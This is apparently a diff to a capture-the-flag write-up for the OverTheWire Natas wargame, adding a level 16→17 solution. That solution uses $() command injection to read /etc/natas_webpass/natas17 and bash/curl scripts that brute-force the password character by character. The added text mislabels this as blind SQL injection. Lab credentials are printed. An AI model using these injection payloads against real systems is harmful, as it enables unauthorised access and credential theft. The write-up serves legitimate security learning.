@@ -376,10 +376,10 @@ A `blind SQL injection` happens when a web application is vulnerable to SQL inje
 
 The database table has `username` and `password` fields for each user. We will find `Natas16`'s password char by char by using some `SQL` features:
 * `LIKE` - that operator lets us search a field not by static value, but with a template. It compares char by char instead of full strings.
-* `%` - When using `LIKE`, `%` acts like a "wild card", for example `%a` fits all values ending with 'a'.
+* `%` - When using `LIKE`, `%` acts like a "wild card", for example `%a` fits all values ending with an 'a'.
 * `BINARY` - that operator lets us compare by binary value, important for case sensitivity.
 
-We can see the query in the page sourcecode:
+We can see the query in the page source code:
 ```php
 $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
 ```
@@ -387,7 +387,7 @@ Notice that the value comes from `$_REQUEST`, which can be either `GET`, `POST` 
 ```sql
 SELECT * from users where username="natas16" and password LIKE BINARY "<prefix>%"
 ```
-This way, we can brute force over the optional chars and everytime we add a char to the prefix. If we added a char and it's a currect prefix, the server will respond that this user exists. Then we add it to the prefix and try to guess the next char, until we have all 32 chars of the password. As explained, this is a type of `blind SQL injection`.
+This way, we can brute force over the optional chars, adding everytime a char to the prefix. If we added a char and it's a currect prefix, the server will respond that this user exists. Then we add it to the prefix and try to guess the next char, until we have all 32 chars of the password. As explained, this is a type of `blind SQL injection`.
 
 ```bash
 #!/bin/bash
@@ -414,3 +414,67 @@ echo $prefix
 We run this code and get the next password.
 
 Password: `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`
+
+## Level 16 → 17
+Similar to [level 9](https://github.com/iAdani/Cyber-Learning/tree/main/OverTheWire/Natas#level-9--10), we have an input and the website searches it inside `dictionary.txt` using `grep`. But this time, the input is being checked, not allowing certain symbols (```[;|&`\'"]```), and also being placed inside quotes (`"<input>"`) so getting the password is harder. Since `"` is banned by the server we need to use another technique, and luckily `$()` are not banned.
+
+Similar to the previous level, we will try to get the password char by char by using `blind SQL injection`. We can use `$()` to execute commands inside the `grep` parameter, and it's output will be the search input. For example, if we use `$(whoami)`, the search input will be `natas17`. In our case, we will use another `grep`, and it's output will be the input of the server's `grep`.
+
+First, we will test an input that the password cannot contain.
+```bash
+$(grep $$$ /etc/natas_webpass/natas17)
+```
+The website returns everything inside `dictionary.exe`, and this is because the output of that command is empty, so every line returns true for the server's `grep`. Next, we will try some legitimate chars that can appear inside the password file.
+```bash
+$(grep a /etc/natas_webpass/natas17)
+$(grep b /etc/natas_webpass/natas17)
+```
+The first input `a` gives a response similar to `$$$`, so there is no `a` in the password. on the other hand, `b` gives an empty response, so we know that there is a `b` in the password.
+
+```bash
+#!/bin/bash
+url="http://natas16.natas.labs.overthewire.org"
+credentials="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
+passChars=""
+chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+for char in $(echo $chars | fold -w1); do
+	response=$(curl -s -u $credentials "$url?needle=\$(grep+$char+/etc/natas_webpass/natas17)&submit=Search");
+
+	if ! echo "$response" | grep -q "April"; then
+		passChars=$passChars$char
+	fi
+done
+echo $passChars
+```
+We go over all the options and we find that the password only contain these chars `bhjkoqsvwCEFHJLNOT05789`, but we do not know the order. We will do something similar to the previous level.
+```bash
+#!/bin/bash
+url="http://natas16.natas.labs.overthewire.org"
+credentials="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
+pass=""
+chars="bhjkoqsvwCEFHJLNOT05789"
+
+while true; do
+	counter=0
+	for char in $(echo $chars | fold -w1); do
+		response=$(curl -s -u $credentials "$url?needle=\$(grep+$pass$char+/etc/natas_webpass/natas17)&submit=Search");
+
+		if ! echo "$response" | grep -q "April"; then
+			pass=$pass$char
+			echo "found $char"
+			counter=35
+		fi
+		((counter++))
+	done
+	if [ $counter -eq ${#chars} ]; then
+		break
+	fi
+done
+echo $pass
+```
+This time, we start with `b` and then try to append each char after it. If the sequence `b<char>` is not a part of the password we will get the dictionary content, otherwise it is part of the password and we can add it and try another char. So at the end, we will have `b<rest of the password>`, which is the right part of the password where `b` is the separator.
+
+We get the output `bo7LFNb8vwhHb9s75hokh5TF0OC`. Now to find the left part, we will do the same but trying to add each char to the left of this output. I will not bring that code as it is very similar, but at the end we get the full password.
+
+Password: `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`
